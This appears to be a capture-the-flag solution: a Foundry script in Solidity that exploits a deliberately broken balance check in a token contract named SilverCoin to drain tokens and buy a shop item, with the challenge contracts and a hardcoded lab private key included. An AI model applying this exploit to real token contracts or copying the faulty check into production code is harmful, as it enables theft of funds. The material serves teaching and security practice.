// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xd2385A1291a243D3D517e682E654F4975b9D51fC);
    address wallet = 0x724BCBA6400A9c0d75c7399D86a270892733ca54;
    Shop public target = setup.TARGET();
    SilverCoin public silverCoin;

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x87f6c0230543b452781a44e07eee75f9f5c8e675153c80a31b79ecbd06054ede);

        silverCoin = SilverCoin(address(uint160(uint256(vm.load(address(target), bytes32(abi.encode(1)))))));

        silverCoin.transfer(address(silverCoin), 101);
        silverCoin.approve(address(target), type(uint256).max);
        target.buyItem(2);

        console.log(silverCoin.balanceOf(wallet));
        console.log(setup.isSolved(wallet));

        vm.stopBroadcast();
    }
}

// "PrivateKey": "0x87f6c0230543b452781a44e07eee75f9f5c8e675153c80a31b79ecbd06054ede",
//     "Address": "0x724BCBA6400A9c0d75c7399D86a270892733ca54",
//     "TargetAddress": "0x866A1794E52845F1139A340d561947b862B1a175",
//     "setupAddress": "0xd2385A1291a243D3D517e682E654F4975b9D51fC"


contract Setup {
    Shop public immutable TARGET;

    constructor(address _player) payable {
        require(msg.value == 1 ether);
        SilverCoin silverCoin = new SilverCoin();
        silverCoin.transfer(_player, 100);
        TARGET = new Shop(address(silverCoin));
    }

    function isSolved(address _player) public view returns (bool) {
        (,, address ownerOfKey) = TARGET.viewItem(2);
        return ownerOfKey == _player;
    }
}

contract Shop {
    struct Item {
        string name;
        uint256 price;
        address owner;
    }

    Item[] public items;
    SilverCoin silverCoin;

    constructor(address _silverCoinAddress) {
        silverCoin = SilverCoin(_silverCoinAddress);
        items.push(Item("Diamond Necklace", 1_000_000, address(this)));
        items.push(Item("Ancient Stone", 70_000, address(this)));
        items.push(Item("Golden Key", 25_000_000, address(this)));
    }

    function buyItem(uint256 _index) public {
        Item memory _item = items[_index];
        require(_item.owner == address(this), "Item already sold");
        bool success = silverCoin.transferFrom(msg.sender, address(this), _item.price);
        require(success, "Payment failed!");
        items[_index].owner = msg.sender;
    }

    function viewItem(uint256 _index) public view returns (string memory, uint256, address) {
        return (items[_index].name, items[_index].price, items[_index].owner);
    }
}

contract SilverCoin {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name = "SilverCoins";
    string public symbol = "SVC";
    uint256 public totalSupply;

    constructor() {
        _mint(msg.sender, 1_000_000_000_000_000);
    }

    function decimals() public pure returns (uint256) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transferFrom(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance - amount >= 0, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _transferFrom(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
}
